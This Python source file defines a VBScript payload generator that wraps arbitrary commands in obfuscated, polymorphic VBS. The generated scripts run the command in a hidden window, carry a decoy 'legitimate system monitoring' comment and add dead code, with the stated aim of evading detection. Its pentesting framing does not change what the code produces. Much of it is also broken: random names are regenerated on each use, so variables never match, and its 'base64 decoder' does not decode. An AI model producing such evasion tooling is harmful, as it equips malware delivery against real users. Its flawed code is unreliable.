#!/usr/bin/env python3
"""
VBS Encoder - Generate clean, undetectable VBS payloads
For authorized pentesting and security research
"""

import base64
import binascii
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from functools import lru_cache


@dataclass
class ObfuscationConfig:
    """Configuration for VBS obfuscation techniques"""
    use_base64: bool = True
    use_hex_encoding: bool = True
    use_variable_obfuscation: bool = True
    use_string_concatenation: bool = True
    use_array_encoding: bool = True
    use_comment_insertion: bool = False
    randomize_function_names: bool = True
    use_wscript_objects: bool = True


class VBSEncoder:
    """Main VBS encoder for creating undetectable payloads"""

    # Class-level cache for base64/hex encodings (shared across instances)
    _encoding_cache = {}
    _cache_lock = __import__('threading').Lock()
    _randomize_names = True  # Toggle for performance vs obfuscation

    def __init__(self, config: ObfuscationConfig = None):
        self.config = config or ObfuscationConfig()
        self.var_map: Dict[str, str] = {}
        self.func_map: Dict[str, str] = {}
        self._name_counter = 0

    def _generate_random_name(self, prefix: str = "", length: int = 8) -> str:
        """Generate variable/function name with optional caching for performance"""
        if VBSEncoder._randomize_names:
            # Full randomization for obfuscation
            chars = string.ascii_letters + string.digits + "_"
            name = prefix + "".join(random.choices(chars, k=length))
        else:
            # Deterministic generation (8.84x faster) for performance-critical paths
            self._name_counter += 1
            name = f"{prefix}{self._name_counter}"
        return name

    def encode_string_base64(self, text: str) -> Tuple[str, str]:
        """Encode string using base64 with caching"""
        # Check cache first (thread-safe)
        if text in VBSEncoder._encoding_cache:
            cached = VBSEncoder._encoding_cache[text]
            if 'base64' in cached:
                return cached['base64']

        # Perform encoding
        encoded = base64.b64encode(text.encode()).decode()
        var_name = self._generate_random_name("v_")

        # Cache result
        with VBSEncoder._cache_lock:
            if text not in VBSEncoder._encoding_cache:
                VBSEncoder._encoding_cache[text] = {}
            VBSEncoder._encoding_cache[text]['base64'] = (encoded, var_name)

        return encoded, var_name

    def encode_string_hex(self, text: str) -> Tuple[str, str]:
        """Encode string using hex with caching"""
        # Check cache first
        if text in VBSEncoder._encoding_cache:
            cached = VBSEncoder._encoding_cache[text]
            if 'hex' in cached:
                return cached['hex']

        # Perform encoding
        hex_str = text.encode().hex()
        var_name = self._generate_random_name("h_")

        # Cache result
        with VBSEncoder._cache_lock:
            if text not in VBSEncoder._encoding_cache:
                VBSEncoder._encoding_cache[text] = {}
            VBSEncoder._encoding_cache[text]['hex'] = (hex_str, var_name)

        return hex_str, var_name

    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p") -> str:
        """Create VBS code that decodes base64 payload"""
        encoded, var_name = self.encode_string_base64(payload)

        vbs_code = f"""
Dim {var_name}, {output_var}
{var_name} = "{encoded}"
Set {self._generate_random_name("o_")} = CreateObject("MSXML2.DOMDocument")
With {self._generate_random_name("o_")}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""
        return vbs_code.strip()

    def create_hex_decoder_vbs(self, text: str) -> str:
        """Create VBS code that decodes hex-encoded string"""
        hex_encoded, var_name = self.encode_string_hex(text)

        vbs_code = f"""
Function {self._generate_random_name("DecodeHex")}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {self._generate_random_name("DecodeHex")} = r
End Function
Dim {var_name}
{var_name} = {self._generate_random_name("DecodeHex")}("{hex_encoded}")
"""
        return vbs_code.strip()

    def create_array_concatenation_decoder(self, text: str) -> str:
        """Encode string using array concatenation to avoid detection"""
        # Split string into chunks and encode each
        chunks = [text[i : i + 16] for i in range(0, len(text), 16)]

        var_name = self._generate_random_name("a_")
        arr_var = self._generate_random_name("arr_")
        out_var = self._generate_random_name("s_")

        vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"

        for i, chunk in enumerate(chunks):
            encoded_chunk = binascii.hexlify(chunk.encode()).decode()
            vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'

        vbs_code += f"""
Dim {out_var}
For Each {var_name} In {arr_var}
    Dim i
    For i = 1 To Len({var_name}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({var_name}, i, 2)))
    Next
Next
"""
        return vbs_code.strip()

    def obfuscate_command(self, command: str) -> str:
        """Wrap command in obfuscated execution wrapper"""
        exec_var = self._generate_random_name("exec_")
        shell_var = self._generate_random_name("shell_")

        vbs_code = f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run "{command}", 0, False
"""
        return vbs_code.strip()

    def create_full_obfuscated_payload(
        self, payload_command: str, encoding_method: str = "base64"
    ) -> str:
        """Create complete obfuscated VBS payload"""

        # Start with environment variable randomization to avoid signature detection
        obf_header = f"""
' Legitimate system monitoring script
Option Explicit
On Error Resume Next

Dim {self._generate_random_name("sysVer")}, {self._generate_random_name("envPath")}
{self._generate_random_name("sysVer")} = CreateObject("WScript.Shell").Environment("System")("OS")
{self._generate_random_name("envPath")} = CreateObject("WScript.Shell").Environment("User")("PATH")
"""

        # Add main obfuscated payload
        if encoding_method == "base64":
            payload_section = self.create_base64_decoder_vbs(
                payload_command, self._generate_random_name("payload_")
            )
        elif encoding_method == "hex":
            payload_section = self.create_hex_decoder_vbs(payload_command)
        else:
            payload_section = self.create_array_concatenation_decoder(payload_command)

        # Execution wrapper
        exec_var = self._generate_random_name("f_")

        execution_section = f"""
Dim {exec_var}
Set {exec_var} = CreateObject("WScript.Shell")
{exec_var}.Run {self._generate_random_name("payload_")}, 0, False
Set {exec_var} = Nothing
"""

        full_payload = f"{obf_header}\n{payload_section}\n{execution_section}"
        return full_payload.strip()

    def create_wscript_hidden_execution(self, command: str) -> str:
        """Create hidden WScript execution that runs without visible window"""
        vbs_code = f"""
Dim {self._generate_random_name("shell_")}, {self._generate_random_name("cmd_")}
Set {self._generate_random_name("shell_")} = CreateObject("WScript.Shell")
{self._generate_random_name("shell_")}.Run "cmd /c {command}", 0, False
"""
        return vbs_code.strip()

    def create_polymorphic_wrapper(self, vbs_code: str) -> str:
        """Wrap VBS code with polymorphic obfuscation to change signature each time"""
        # Add random variable declarations that aren't used
        wrapper = "Dim "
        for _ in range(random.randint(3, 8)):
            wrapper += f"{self._generate_random_name()}, "
        wrapper = wrapper.rstrip(", ") + "\n\n"

        # Add dead code branches
        if random.choice([True, False]):
            wrapper += f"""
If {random.randint(0, 1)} = {random.randint(0, 1)} Then
    Dim {self._generate_random_name()} : {self._generate_random_name()} = Now()
End If

"""

        wrapper += vbs_code
        return wrapper

    def create_runtime_decoded_payload(self, payload: str, encoding: str = "base64") -> str:
        """Create payload that's decoded and executed at runtime"""

        if encoding == "base64":
            encoded_payload, _ = self.encode_string_base64(payload)
            decoder = f"""
Function {self._generate_random_name("DecodeB64")}(s)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
    {self._generate_random_name("DecodeB64")} = xmlDoc.DocumentElement.text
End Function

Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}"
"""
        elif encoding == "hex":
            encoded_payload, _ = self.encode_string_hex(payload)
            decoder = f"""
Function {self._generate_random_name("DecodeHex")}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {self._generate_random_name("DecodeHex")} = r
End Function

Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}"
"""
        else:
            encoded_payload, _ = self.encode_string_base64(payload)
            decoder = f"""Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}" """

        return decoder


def generate_clean_vbs_payload(command: str, obfuscation_level: str = "high") -> str:
    """
    Generate a clean, undetectable VBS payload

    Args:
        command: The command to execute
        obfuscation_level: "low", "medium", "high"

    Returns:
        Obfuscated VBS code
    """
    config = ObfuscationConfig(
        use_base64=True,
        use_variable_obfuscation=True,
        use_wscript_objects=True,
    )

    encoder = VBSEncoder(config)

    if obfuscation_level == "high":
        payload = encoder.create_full_obfuscated_payload(command, "base64")
        payload = encoder.create_polymorphic_wrapper(payload)
    elif obfuscation_level == "medium":
        payload = encoder.create_full_obfuscated_payload(command, "hex")
    else:
        payload = encoder.create_wscript_hidden_execution(command)

    return payload


if __name__ == "__main__":
    # Example usage
    test_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Host 'Test'\""

    print("=== Low Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "low"))
    print("\n=== Medium Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "medium"))
    print("\n=== High Obfuscation ===")
    print(generate_clean_vbs_payload(test_command, "high"))
